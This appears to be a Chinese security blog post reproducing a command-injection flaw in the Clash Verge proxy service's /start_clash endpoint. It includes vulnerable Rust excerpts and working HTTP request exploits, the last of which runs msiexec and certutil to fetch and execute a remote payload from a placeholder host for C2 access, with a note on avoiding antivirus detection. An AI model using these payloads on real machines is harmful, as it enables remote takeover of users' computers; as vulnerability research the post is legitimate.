#  Clash verge 漏洞复现   
Hne  安全的黑魔法   2025-05-11 01:30  
  
# Clash verge  
  
**Clash verge**  
是一款非常经典的 "**科学上网**  
" 工具,目前大部分人群的科学上网都依赖该类工具.由于本机也装了该工具，所以对此格外上心。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgz9AcFzSAQwguvicTJgwzAqEReMCtV2OgqrI0OExibCFoBbKLiboFIYQKfw/640?wx_fmt=png&from=appmsg "")  
  
isu 漏洞中提到为**本地提权**  
，并没有相关 POC，尝试定位问题代码，实现 EXP。  
  
下载漏洞代码：**clash-verge-service-dev**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgz42ayzX7nUASdgymf3rpGJ2CzMQHYNsRSButnDVqiaSZ76sJYgI4aPNA/640?wx_fmt=png&from=appmsg "")  
  
### 审计过程：  
  
Web 服务在**src/service/mod.rs **中定义了/start_clash 接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgzNF05RdoYLMuQicOCnm00rT8trD9Jefp7e0l55liaSdb6r369iaNvvXUFw/640?wx_fmt=png&from=appmsg "")  
  
这个接口接收 HTTP POST 请求，并将请求体解析为 StartBody 结构体，结构体定义在**src/service/data.rs**  
```
#[derive(Default, Debug, Deserialize, Serialize, Clone)]pub struct StartBody {    pub core_type: Option<String>,    pub bin_path: String,    pub config_dir: String,    pub config_file: String,    pub log_file: String,}
```  
  
请求体被传递给 CoreManager.start_clash() 方法 **src/service/core.rs**  
 ：  
  
并在**start_clash**  
方式数据被存储在 CoreManager.clash_status.runtime_config 中  
  
通过调用**start_mihomo()**函数，该函数将最终触发命令执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgzZHbjafIRIIHngHZorwsh8IyLIH40Vhhvyv9tuaFFPChDG3QNjajxbg/640?wx_fmt=png&from=appmsg "")  
  
  
  
具体漏洞代码如下：  
```
    /////////////////////////////////////////////////////////////////////    ///漏洞关键处///            let bin_path = config.bin_path.as_str(); // 数据包中的bin_path在此处被提取            let config_dir = config.config_dir.as_str();            let config_file = config.config_file.as_str();            let log_file = config.log_file.as_str();            let args = vec!["-d", config_dir, "-f", config_file]; // 直接拼接    ////////////////////////////////////////////////////////////////////            // 创建日志文件            let log = std::fs::File::create(log_file)                .with_context(|| format!("Failed to open log file: {}", log_file))?;            let pid = process::spawn_process(bin_path, &args, log)?;            println!("Mihomo started with PID: {}", pid);            self.mihomo_status.inner.lock().unwrap().running_pid.store(pid as i32, Ordering::Relaxed);            self.mihomo_status.inner.lock().unwrap().is_running.store(true, Ordering::Relaxed);            println!("Mihomo started successfully with PID: {}", pid);        }        Ok(())    }
```  
  
**clash-verge-service-dev\src\service\process.rs**  
  -->   **spawn_process**  
 函数命令执行：  
```
pub fn spawn_process(command: &str, args: &[&str], mut log: std::fs::File) -> io::Result<u32> {    // Log the command being executed    let _ = writeln!(log, "Spawning process: {} {}", command, args.join(" "));    log.flush()?;    #[cfg(target_os = "macos")]    {        // On macOS, use posix_spawn via Command        //未经验证的command 即参数bin_path 作为执行程序        let child = Command::new(command)            // 未经验证的args作为命令参数            .args(args)            .stdout(Stdio::from(log))            .stderr(Stdio::null())            .spawn()?;        // Get the process ID        let pid = child.id();        // Detach the child process        std::thread::spawn(move || {            let _ = child.wait_with_output();        });        Ok(pid)    }    #[cfg(not(target_os = "macos"))]    {        // [漏洞点1] 同样直接使用未经验证的command作为执行程序        let child = Command::new(command)            // [漏洞点2] 同样直接使用未经验证的args作为命令参数            .args(args)            .stdout(log)            .stderr(Stdio::null())            .spawn()?;        Ok(child.id())    }}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgzKLeLFgDTibVvZwJ4VKzHOklfNVLQ20Wm8cMFPhYlHjQruVDoh9ztUnA/640?wx_fmt=png&from=appmsg "")  
  
### 漏洞流程分析  
  
**参数传递过程：**  
1. 从/start_clash HTTP 接口接收用户输入的 StartBody 结构体  
  
1. 然后数据被存储在 CoreManager.clash_status.runtime_config 中  
  
1. 下面从 runtime_config 中获取这些用户可控的输入值  
  
1. 构建命令行参数，但没有验证参数内容的安全性 ：**let args = vec!["-d", config_dir, "-f", config_file];**  
  
1. 调用 process::spawn_process 函数，将用户提供的命令和参数直接传递给系统执行  **let pid = process::spawn_process(bin_path, &args, log)?;**  
  
可以看到原程序的预期运行命令如下：  
  
![image-20250508201652315](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgz2TLiavmA8blzm1UWN77EtHicnibnIPQEUsibDiaQ8NYYnEeGzJlJbsaZAHg/640?wx_fmt=png&from=appmsg "")  
  
image-20250508201652315  
```
"E:\Clash\verge-mihomo.exe" -d C:\Users\Anonymous\AppData\Roaming\io.github.clash-verge-rev.clash-verge-rev -f C:\Users\Anonymous\AppData\Roaming\io.github.clash-verge-rev.clash-verge-rev\clash-verge.yaml
```  
  
E:\Clash\verge-mihomo.exe 即默认 **bin_path**  
 的值  
  
C:\Users\Anonymous\AppData\Roaming\io.github.clash-verge-rev.clash-verge-rev 即默认 **config_dir**  
 的值  
  
C:\Users\Anonymous\AppData\Roaming\io.github.clash-verge-rev.clash-verge-rev\clash-verge.yaml 即默认 **config_file**  
 的值  
  
由此全部可控，导致命令执行。  
  
**POC/EXP**  
构造如下：  
```
POST /start_clash HTTP/1.1Host: 127.0.0.1:33211Content-Type: application/json{"core_type":"verge-mihome","bin_path":"cmd.exe","config_dir":"","config_file":"/c calc ","log_file":"C:\\Windows\\Temp\\5.log"}
```  
  
![image-20250508204232164](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgzezWJhJgLHn5SpZkKBFr1mBBBKjCNsbtzAMze86OpoTdXTIVcicuuIBA/640?wx_fmt=png&from=appmsg "")  
  
可以看到 **clash-verge-service.exe**  
 拉起一个 cmd.exe 子进程  
  
![image-20250508204401925](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgzFXCYuU6qt4N2DNmRPs8zvYI6UbdiaVESiafCzuwWGmASRyiaRhpiaUFTgQ/640?wx_fmt=png&from=appmsg "")  
  
还有一些其他问题，比如传入参数转义等等，就不赘述了。  
### 远程命令执行:  
  
由于该服务进程默认仅监听**127.0.0.1:33211**  
，所以大部分情况只考虑其本地提权特性，  
  
![image-20250508204459517](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgzBVnkfZ0xmhF2kIsEGNvpYVcQc7VyFoRTic0HyJk9DNoVaxeF7texE3w/640?wx_fmt=png&from=appmsg "")  
  
但是在部分情况下，用户可能会勾选**局域网访问**  
，由此增加了**远程命令执行**  
的可能  
  
![image-20250508205851097](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgz6Z5C2YUABEvgdQ9rTQNGhQwicI0spYByspDHkrjvtOUk6PCTOlPF7qw/640?wx_fmt=png&from=appmsg "")  
  
通过代理隧道，访问该机器的 33211 端口，实现远程命令执行  
  
![image-20250508210938880](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgzwgTxibYjd9kwTZ5z5dV14NA90OKefIicMRPjZfHExGlvxUuqbibmOyRdQ/640?wx_fmt=png&from=appmsg "")  
  
![image-20250510021634490](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFS0tuTfFPgfJLtykrLK2wgzQy0WWpb9Q0mO3ozHXNNU5uv9DLo2Z5r21qzqEunuCJiatfQM8h1nPvQ/640?wx_fmt=png&from=appmsg "")  
  
但是在本地环境测试时，经常性会出现，在打过一次 poc 之后，会导致 clash verge 直接挂掉，除非重启程序，否则无法进行第二次发包。  
  
所以很多公众号提到的，通过任意文件写入，第二步直接执行，在远程测试时，都失败了。  
  
如果命令只有一次执行机会，那就直接尝试上线 c2  
  
常见上线命令：  
```
certutil.exe -urlcache -split -f http:/x.x.x.x:9000/x.exe C:\Users\Public\Downloads\x.exe && C:\Users\Public\Downloads\x.exe
```  
  
但该命令会直接被杀软/火绒拦截，可以使用其他上线姿势：  
```
msiexec /q /i http:/x.x.x.x:9000/2.msi && echo 1
```  
  
最后**POC**  
：  
```
POST /start_clash HTTP/1.1Host: 127.0.0.1:33211Content-Type: application/json{"core_type":"verge-mihome","bin_path":"cmd.exe","config_dir":"","config_file":"/c  msiexec /q /i http:/x.x.x.x:9000/2.msi && echo 1","log_file":"C:\\Windows\\Temp\\5.log"}
```  
  
  
补充一句：由于同源策略问题，该漏洞目前无法设计成蜜罐。  
  
  
